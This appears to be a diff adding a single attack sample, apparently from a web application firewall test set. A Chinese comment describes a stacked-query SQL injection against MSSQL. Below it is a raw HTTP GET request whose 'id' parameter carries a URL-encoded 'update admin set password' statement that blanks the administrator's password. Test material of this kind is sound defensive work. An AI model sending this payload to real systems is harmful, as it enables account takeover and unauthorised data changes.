@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506394
+# 攻击者基于堆叠查询，将"update admin set password ='' where id=1"语句注入到 SQL 查询参数中，利用update语句可以修改任意表中数据。
+GET /?id=1%3Bupdate%20admin%20set%20password%20=%27%27%20where%20id=1&bid=hd_tag_m8mv23w2 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23w2
+RM-PRO-Token: 380f81c3d4cf42503f415abcf0ed94c0
+RM-PRO-Time: 1742808348444
+User-Agent: curl/7.83.1
+
